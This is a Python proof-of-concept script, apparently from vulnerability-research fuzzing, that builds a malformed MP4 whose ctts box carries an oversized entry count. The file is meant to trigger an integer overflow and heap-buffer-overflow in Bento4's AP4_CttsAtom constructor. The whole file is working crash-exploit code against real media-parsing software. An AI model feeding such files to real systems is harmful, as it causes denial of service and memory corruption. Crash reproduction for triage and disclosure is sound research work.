#!/usr/bin/env python3
"""
PoC generator for VULN 001: Bento4 Ap4CttsAtom.cpp integer overflow
Constructs a minimal MP4 with ctts entry_count=0x20000001 to trigger
heap allocation failure (bad_alloc / DoS) in AP4_CttsAtom constructor.
"""
import struct
import os

OUTPUT = "/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4_h/vuln_001.mp4"


def box(box_type, data):
    """Build a standard MP4 box: size(4B) + type(4B) + data"""
    size = 8 + len(data)
    return struct.pack(">I", size) + box_type + data


def full_box(box_type, version, flags, data):
    """Build a FullBox: size(4B) + type(4B) + version(1B) + flags(3B) + data"""
    header = struct.pack(">B", version) + struct.pack(">I", flags)[1:]  # 1B version + 3B flags
    return box(box_type, header + data)


# ---- ctts box (the malicious one) ----
# entry_count = 0x20000001 with ONE dummy entry (8 bytes) so stream.Read succeeds
# Then the for-loop runs: at i=1, buffer[8] is accessed but buffer is only 8 bytes
# → heap-buffer-overflow caught by ASAN
#
# Integer overflow path:
#   new unsigned char[entry_count*8]
#   = new unsigned char[0x20000001 * 8]  (32-bit arithmetic: both operands are 32-bit)
#   = new unsigned char[8]               (0x100000008 truncated to 32 bits = 8)
#   → only 8 bytes allocated
#
# On 64-bit, EnsureCapacity: count(AP4_Cardinal=uint32) * sizeof(T)(size_t=uint64)
#   = (uint64)0x20000001 * 8 = 4294967304 → ~4GB allocation succeeds on high-RAM systems
#   then SetItemCount initializes 536M entries
#   then stream.Read(buffer, 8) succeeds (8 dummy bytes present)
#   then loop i=1: buffer[8] → heap-buffer-overflow (ASAN detects)
dummy_entry = struct.pack(">II", 1, 0)  # sample_count=1, sample_offset=0
ctts_data = struct.pack(">I", 0x20000001) + dummy_entry  # entry_count + 1 entry
ctts = full_box(b"ctts", 0, 0, ctts_data)
# Box size should be 24
assert len(ctts) == 24, f"ctts size should be 24, got {len(ctts)}"

# ---- stco: full atom, entry_count=0 ----
stco = full_box(b"stco", 0, 0, struct.pack(">I", 0))

# ---- stsz: full atom, sample_size=0, sample_count=0 ----
stsz = full_box(b"stsz", 0, 0, struct.pack(">II", 0, 0))

# ---- stsc: full atom, entry_count=0 ----
stsc = full_box(b"stsc", 0, 0, struct.pack(">I", 0))

# ---- stts: full atom, entry_count=0 ----
stts = full_box(b"stts", 0, 0, struct.pack(">I", 0))

# ---- stsd: full atom, entry_count=0 ----
stsd = full_box(b"stsd", 0, 0, struct.pack(">I", 0))

# ---- stbl box containing stsd + stts + stsc + stsz + stco + ctts ----
stbl_data = stsd + stts + stsc + stsz + stco + ctts
stbl = box(b"stbl", stbl_data)

# ---- smhd: full atom, 16 bytes (balance=0, reserved=0) ----
smhd = full_box(b"smhd", 0, 0, struct.pack(">HH", 0, 0))
assert len(smhd) == 16

# ---- dref with one url entry ----
# url entry: full box, flags=0x000001 (self-contained), no data
url_data = b""
url_entry = full_box(b"url ", 0, 1, url_data)
dref_payload = struct.pack(">I", 1) + url_entry  # entry_count=1 + url box
dref = full_box(b"dref", 0, 0, dref_payload)
dinf = box(b"dinf", dref)

# ---- minf box containing smhd + dinf + stbl ----
minf_data = smhd + dinf + stbl
minf = box(b"minf", minf_data)

# ---- mdhd: full atom, version=0 -> 32 bytes total ----
# creation_time(4) + modification_time(4) + timescale(4) + duration(4) + language(2) + pre_defined(2)
# language packed as 3x5bit chars encoded in 2B; pre_defined=0
mdhd_payload = struct.pack(">IIII", 0, 0, 44100, 0) + struct.pack(">HH", 0x55C4, 0)
mdhd = full_box(b"mdhd", 0, 0, mdhd_payload)
assert len(mdhd) == 32

# ---- hdlr: full atom ----
# pre_defined(4) + handler_type(4) + reserved(12) + name(1+ null)
hdlr_payload = struct.pack(">I", 0) + b"soun" + b"\x00" * 12 + b"SoundHandler\x00"
hdlr = full_box(b"hdlr", 0, 0, hdlr_payload)

# ---- mdia box containing mdhd + hdlr + minf ----
mdia_data = mdhd + hdlr + minf
mdia = box(b"mdia", mdia_data)

# ---- tkhd: full atom, version=0 -> 92 bytes total ----
# fields: creation(4)+modification(4)+track_id(4)+reserved(4)+duration(4)+
#         reserved2(8)+layer(2)+alt_group(2)+volume(2)+reserved3(2)+matrix(36)+
#         width(4)+height(4)
tkhd_payload = (
    struct.pack(">IIIII", 0, 0, 1, 0, 0) +  # creation, mod, track_id, reserved, duration
    b"\x00" * 8 +                             # reserved
    struct.pack(">hhhh", 0, 0, 0x0100, 0) +  # layer, alt_group, volume(1.0), reserved
    # unity matrix
    b"\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
    b"\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00" +
    b"\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00" +
    struct.pack(">II", 0, 0)                  # width, height
)
tkhd = full_box(b"tkhd", 0, 3, tkhd_payload)  # flags=3 (track enabled + in movie)
assert len(tkhd) == 92, f"tkhd length {len(tkhd)}"

# ---- trak box containing tkhd + mdia ----
trak_data = tkhd + mdia
trak = box(b"trak", trak_data)

# ---- mvhd: full atom, version=0 -> 108 bytes total ----
# creation(4)+modification(4)+timescale(4)+duration(4)+rate(4)+volume(2)+
# reserved(10)+matrix(36)+pre_defined(24)+next_track_id(4)
mvhd_payload = (
    struct.pack(">IIII", 0, 0, 1000, 0) +    # creation, mod, timescale, duration
    struct.pack(">I", 0x00010000) +            # rate = 1.0
    struct.pack(">H", 0x0100) +               # volume = 1.0
    b"\x00" * 10 +                            # reserved
    # unity matrix
    b"\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
    b"\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00" +
    b"\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00" +
    b"\x00" * 24 +                            # pre_defined
    struct.pack(">I", 2)                       # next_track_id
)
mvhd = full_box(b"mvhd", 0, 0, mvhd_payload)
assert len(mvhd) == 108, f"mvhd length {len(mvhd)}"

# ---- moov box containing mvhd + trak ----
moov_data = mvhd + trak
moov = box(b"moov", moov_data)

# ---- ftyp box ----
# size(4) + 'ftyp'(4) + major_brand(4) + minor_version(4) = 16 bytes, no compat brands
ftyp = box(b"ftyp", b"M4A " + struct.pack(">I", 0))
assert len(ftyp) == 16

# ---- Assemble the file ----
mp4 = ftyp + moov

os.makedirs(os.path.dirname(OUTPUT), exist_ok=True)
with open(OUTPUT, "wb") as f:
    f.write(mp4)

print(f"[+] Written {len(mp4)} bytes to {OUTPUT}")
print(f"[+] ctts box: size={len(ctts)}, entry_count=0x20000001")
print(f"[+] Expected: std::bad_alloc or crash in AP4_CttsAtom constructor")
